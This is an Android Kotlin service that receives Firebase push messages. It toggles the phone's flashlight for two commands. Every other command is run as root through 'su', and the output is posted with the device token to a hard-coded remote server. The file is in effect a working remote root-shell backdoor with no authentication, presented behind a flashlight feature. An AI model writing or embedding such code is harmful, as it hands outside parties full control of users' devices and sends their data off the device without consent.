package com.app.control

import android.annotation.SuppressLint
import android.content.Context
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraManager
import android.util.Log
import com.google.firebase.messaging.FirebaseMessaging
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import org.json.JSONObject


@SuppressLint("MissingFirebaseInstanceTokenRefresh")
class MyFirebaseMessagingService : FirebaseMessagingService() {

    companion object {
        private const val TAG = "MyFirebaseMsgService"
        private const val API_URL = "https://file.quockhanh020924.id.vn/devices/return-client"
    }

    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        Log.d(TAG, "From: ${remoteMessage.from}")

        remoteMessage.data["command"]?.let { command ->
            Log.d(TAG, "Received command: $command")

            val responseMessage = when (command.lowercase()) {
                "flash on" -> {
                    toggleFlash(true)
                    "flash on"
                }
                "flash off" -> {
                    toggleFlash(false)
                    "flash off"
                }
                else -> executeCommandAsRoot(command)
            }

            // Lấy FCM Token của thiết bị và gửi response
            FirebaseMessaging.getInstance().token.addOnSuccessListener { token ->
                sendResponseToServer(token, responseMessage)
            }
        }
    }

    /**
     * Bật/tắt đèn flash.
     */
    private fun toggleFlash(state: Boolean) {
        val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        try {
            val cameraId = cameraManager.cameraIdList[0] // Lấy ID camera sau
            cameraManager.setTorchMode(cameraId, state)
        } catch (e: CameraAccessException) {
            Log.e(TAG, "Error toggling flash", e)
        }
    }

    /**
     * Thực thi command với quyền root.
     */
    private fun executeCommandAsRoot(command: String): String {
        return try {
            val process = Runtime.getRuntime().exec("su")
            process.outputStream.bufferedWriter().use { writer ->
                writer.write("$command\n")
                writer.write("exit\n")
                writer.flush()
            }
            val output = StringBuilder()
            process.inputStream.bufferedReader().forEachLine { output.append(it).append("\n") }
            process.waitFor()
            output.toString().trim()
        } catch (e: Exception) {
            Log.e(TAG, "Error executing command", e)
            e.message ?: "Error executing command"
        }
    }

    /**
     * Gửi response về API.
     */
    private fun sendResponseToServer(fcmToken: String, message: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val client = OkHttpClient()
                val json = JSONObject().apply {
                    put("fcmTokenDevice", fcmToken)
                    put("message", message)
                }

                val body = RequestBody.create("application/json".toMediaTypeOrNull(), json.toString())
                val request = Request.Builder()
                    .url(API_URL)
                    .post(body)
                    .build()

                val response = client.newCall(request).execute()
                val responseBody = response.body?.string()

                withContext(Dispatchers.Main) {
                    Log.d(TAG, "Response from server: $responseBody")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error sending response to server", e)
            }
        }
    }
}
